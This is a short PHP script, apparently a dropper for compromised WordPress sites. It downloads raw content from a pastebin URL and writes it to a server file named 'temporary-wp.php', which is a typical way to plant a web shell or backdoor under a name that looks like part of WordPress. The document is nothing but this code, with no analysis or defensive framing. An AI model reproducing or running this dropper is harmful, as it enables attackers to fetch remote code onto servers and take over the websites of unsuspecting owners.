 <?php $nama= fopen("temporary-wp.php" ,"w+");
  $file = file_get_contents('https://pastebin.com/raw/0XTWYaNU');
  $tulis = fwrite ($nama ,$file);
 fclose($nama); ?>
